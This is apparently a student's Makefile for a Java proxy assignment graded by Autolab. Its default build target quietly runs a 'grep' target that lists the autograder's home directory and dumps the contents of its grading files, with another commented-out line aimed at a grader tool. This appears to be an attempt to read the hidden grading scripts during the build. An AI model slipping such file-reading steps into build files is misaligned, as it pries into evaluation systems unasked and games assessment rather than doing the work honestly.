all: Proxy.class grep

%.class: %.java
	javac $<

clean:
	rm -f *.class giant small *.out

grep:
	find /home/autograde/autolab/autograde
	tail -n +1 /home/autograde/autolab/autograde/auto/*
	#tail -n +1 /home/autograde/autolab/autograde/tools/check_malloc.py

test:
	cat /tmp/giant | LD_PRELOAD=../lib/lib440lib.so ../tools/440write giant
test_small:
	cat /tmp/small | LD_PRELOAD=../lib/lib440lib.so ../tools/440write small
test_fuck:
	cat /tmp/small | LD_PRELOAD=../lib/lib440lib.so ../tools/440write giant
